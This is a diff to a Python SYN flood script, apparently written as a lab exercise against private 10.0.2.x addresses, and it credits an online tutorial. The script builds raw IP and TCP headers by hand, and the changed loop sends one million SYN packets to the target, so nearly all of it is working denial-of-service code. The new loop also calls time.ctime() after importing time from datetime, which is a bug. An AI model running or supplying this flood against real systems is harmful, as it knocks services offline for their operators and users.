@@ -4,11 +4,12 @@
 
 # some imports
 import socket, sys
+from datetime import time
 from random import randrange
 from struct import *
-#with help of this site #https://www.binarytides.com/python-syn-flood-program-raw-sockets-linux/
 
 
+# with help of this site #https://www.binarytides.com/python-syn-flood-program-raw-sockets-linux/
 
 
 # checksum functions needed for calculation checksum
@@ -27,8 +28,7 @@ def checksum(msg):
     return s
 
 
-def creat(source_ip,dest_ip):
-
+def creat(source_ip, dest_ip):
     # create a raw socket
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
@@ -56,7 +56,6 @@ def creat(source_ip,dest_ip):
     daddr = socket.inet_aton(dest_ip)
 
     ihl_version = (version << 4) + ihl
-
 
     # the ! in the pack format string means network order
     ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
@@ -102,21 +101,21 @@ def creat(source_ip,dest_ip):
     # final full packet - syn packets dont have any data
     packet = ip_header + tcp_header
 
-    return s,packet
+    return s, packet
 
 
-def syn_flood(src,dst):
-    iterations = 100
-    batch = 10000
-    for i in range(iterations):
-        for b in range (batch):
-            s, packet = creat(src, dst)
-            print(f"i {i} , b {b}")
-            s.sendto(packet, (dst, 0))  # put this in a loop if you want to flood the target
 
+
+
+def syn_flood(src, dst):
+    rang = 1000000
+    s, packet = creat(src, dst)
+    for i in range(rang):
+        print(f"{time.ctime()},{i}")
+        s.sendto(packet, (dst, 0))  # put this in a loop if you want to flood the target
 
 
 if __name__ == '__main__':
     src = "10.0.2.15"
     dst = "10.0.2.5"
-    syn_flood(src,dst)
+    syn_flood(src, dst)
